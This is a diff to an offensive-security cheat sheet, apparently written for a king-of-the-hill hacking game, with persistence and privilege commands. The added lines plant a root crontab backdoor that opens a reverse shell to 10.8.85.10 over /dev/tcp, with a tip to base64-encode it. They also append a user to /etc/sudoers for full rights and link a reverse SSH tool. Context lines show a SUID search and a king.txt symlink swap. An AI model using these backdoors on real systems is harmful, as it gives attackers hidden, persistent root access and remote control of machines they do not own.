@@ -8,6 +8,21 @@ stty raw -echo;fg
 ```
 `reset`
 
+# Compile kingmaker.c with no dep
+```bash
+gcc -static -o proc proc.c
+```
+# Add Backdoor To Crontab (It's not neccessary if you use Reverse SSH)
+Encode with base 64 and add to /etc/crontab
+```bash
+* * * * * root bash -c "0<&196;exec 196<>/dev/tcp/10.8.85.10/9999; sh <&196 >&196 2>&196"
+```
+# Modify /etc/sudoers
+```bash
+echo "$USERNAME ALL=(ALL:ALL) ALL" >> /etc/sudoers
+```
+# [Reverse SSH](https://github.com/NHAS/reverse_ssh)
+
 # Find SUID
 ```bash
 find / -perm /4000 2>/dev/null
@@ -64,9 +79,4 @@ cd /dev/shm/.lokal/x/root
 rm king.txt
 echo "lomarkomar" > x
 ln -s x king.txt
-```
-
-# Compile kingmaker.c with no dep
-```bash
-gcc -static -o proc proc.c
 ```
